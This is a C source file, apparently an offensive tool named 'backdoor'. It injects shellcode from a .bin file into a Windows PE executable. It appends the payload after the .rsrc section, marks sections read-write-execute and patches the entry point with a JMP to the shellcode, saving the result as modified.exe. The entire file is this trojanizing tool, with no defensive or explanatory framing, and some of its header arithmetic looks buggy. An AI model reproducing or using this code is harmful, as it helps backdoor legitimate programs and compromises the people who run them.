#include<Windows.h>
#include<stdio.h>
#include<string.h>
#include<math.h>

unsigned char* calc=NULL;
DWORD shellcodesize = NULL;

LPVOID Backdoor(HANDLE hfile, LPVOID filedata, DWORD filesize)
{
	PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)filedata;
	PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)(dosheader->e_lfanew + (PBYTE)dosheader);
	PIMAGE_SECTION_HEADER sectionheader = IMAGE_FIRST_SECTION(ntheader);
	WORD numberofsections = ntheader->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER rsrcsection = NULL;

	for (int i = 0; i < numberofsections; i++) {
		if (strcmp(sectionheader->Name, ".rsrc") == 0) {
			rsrcsection = sectionheader;
			printf("Section Header at address: 0x%p\tRVA:0x%0.8X\n", sectionheader->VirtualAddress + (PBYTE)dosheader, sectionheader->VirtualAddress);
		}
		sectionheader = (PBYTE)sectionheader + sizeof(IMAGE_SECTION_HEADER);
	}

	sectionheader = IMAGE_FIRST_SECTION(ntheader);
	
	printf("New file size: %d\n", filesize + shellcodesize);
	
	LPVOID newfiledata = HeapAlloc(GetProcessHeap(), 0, filesize + shellcodesize);

	DWORD sizeTillEndOfRsrcOriginal = rsrcsection->PointerToRawData + rsrcsection->SizeOfRawData;
	printf("Initial .rsrc size: %d\n", sizeTillEndOfRsrcOriginal);
	memcpy(newfiledata, filedata, sizeTillEndOfRsrcOriginal);

	memcpy((PBYTE)newfiledata + sizeTillEndOfRsrcOriginal, calc, shellcodesize);

	PIMAGE_SECTION_HEADER copiedrsrc = ((PBYTE)newfiledata + rsrcsection->PointerToRawData);
	copiedrsrc->SizeOfRawData += shellcodesize;

	PIMAGE_SECTION_HEADER currentsection = (PBYTE)rsrcsection +1;
		
	for (int i = (rsrcsection - sectionheader) + 1; i < ntheader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER copiedsection = (PIMAGE_SECTION_HEADER)((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData);
		memcpy((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData, (PBYTE)filedata + currentsection->PointerToRawData, currentsection->SizeOfRawData);
		
		copiedsection->VirtualAddress+=copiedsection->VirtualAddress+shellcodesize;
		copiedsection->PointerToRawData += shellcodesize;
		copiedsection->Characteristics = 0xE00000E0;
		currentsection = currentsection + sizeof(IMAGE_SECTION_HEADER);
	}

	PIMAGE_DOS_HEADER newdosheader = (PIMAGE_DOS_HEADER)newfiledata;
	PIMAGE_NT_HEADERS newntheader = (PIMAGE_NT_HEADERS)((PBYTE)newdosheader + newdosheader->e_lfanew);

	sectionheader = IMAGE_FIRST_SECTION(newntheader);
	DWORD entryPoint = newntheader->OptionalHeader.AddressOfEntryPoint;
	DWORD entryPointOffset = NULL;
	PIMAGE_SECTION_HEADER newrsrcsection = NULL;
	for (int i = 0; i < newntheader->FileHeader.NumberOfSections; i++) {
		if (entryPoint >= sectionheader->VirtualAddress && entryPoint < sectionheader->VirtualAddress + sectionheader->Misc.VirtualSize) {
			entryPointOffset = sectionheader->PointerToRawData + (entryPoint - sectionheader->VirtualAddress);
			break;
		}
		sectionheader++;
	}

	DWORD   jumpAddressWithOffset = sizeTillEndOfRsrcOriginal;
	printf("JUMP ADDRESS (OFFSET): 0x%0.8X\n", jumpAddressWithOffset);

	DWORD alignRsrcPage = ((rsrcsection->SizeOfRawData / 4096 + 1) - ((float)(rsrcsection->SizeOfRawData)) / 4096) * 4096;
	DWORD shellcodeRVA = rsrcsection->VirtualAddress + rsrcsection->SizeOfRawData+alignRsrcPage;
	printf("alignRsrcPage: %d\n", alignRsrcPage);
	
	DWORD entryPointRVA = newntheader->OptionalHeader.AddressOfEntryPoint;
	DWORD relativeOffset = shellcodeRVA - (entryPointRVA+5);

	unsigned char bytes[5];
	bytes[0] = 0xE9;  // JMP opcode
	*(DWORD*)(&bytes[1]) = relativeOffset;

	memcpy((PBYTE)newfiledata + entryPointOffset, bytes, sizeof(bytes));
	
	PIMAGE_SECTION_HEADER newsectionheader = IMAGE_FIRST_SECTION(newntheader);

	for (int i = 0; i < newntheader->FileHeader.NumberOfSections; i++) {
		if (strcmp(newsectionheader->Name, ".reloc") == 0) {
			newsectionheader->Characteristics = 0xE00000E0;
			break;
		}
		newsectionheader++;
	}

	SetFilePointer(hfile, 0, NULL, FILE_BEGIN);
	DWORD filebyteswritten = NULL;
	HANDLE newfile = CreateFileA("modified.exe", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(newfile, newfiledata, filesize + shellcodesize, &filebyteswritten, NULL);
	printf("Bytes written to new file: %d", filebyteswritten);
	SetEndOfFile(newfile);
	
	return 0;
}

int main(int argc, char* argv[])
{
	if (argc < 3) {
		printf("Enter name of the PE file and the .bin file.\n");
		printf("Usage: ./backdoor PE.exe shellcode.bin\n");
		return -1;
	}

	char shellcodeName[MAX_PATH] = { 0 };
	strcpy_s(shellcodeName, MAX_PATH, argv[2]);

	FILE* file = fopen(shellcodeName, "rb");
	if (!file) {
		printf("Error opening shellcode file");
		return -1;
	}

	fseek(file, 0, SEEK_END);

	long shellcodeFileSize = ftell(file);
	if (shellcodeFileSize == -1) {
		printf("Error reading shellcode file size");
		return -1;
	}

	rewind(file);

	calc = (unsigned char*)malloc(shellcodeFileSize);
	if (calc == NULL) {
		printf("Error allocating buffer for shellcode");
		return -1;
	}

	DWORD bytes_read = fread(calc, 1, shellcodeFileSize, file);
	if (bytes_read != shellcodeFileSize) {
		printf("Error reading full shellcode file");
		return -1;
	}
	printf("Shellcode size: %d\n", bytes_read);
	shellcodesize = bytes_read;

	char filename[MAX_PATH] = { 0 };
	strcpy_s(filename, MAX_PATH, argv[1]);
	printf("%s", filename);

	HANDLE hfile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Failed to open file: %d\n", GetLastError());
		return -1;
	}

	DWORD filesize = GetFileSize(hfile, NULL);
	LPVOID filedata = HeapAlloc(GetProcessHeap(), 0, filesize + sizeof(calc));
	DWORD dwsizeread = NULL;
	if (!ReadFile(hfile, filedata, filesize, &dwsizeread, NULL)) {
		printf("Failed to read file properly\n");
		return -1;
	}
	printf("\tFile Size: %d\tFile Present At: 0x%p\n\n", filesize, filedata);
	Backdoor(hfile, filedata, filesize);

	return 0;
}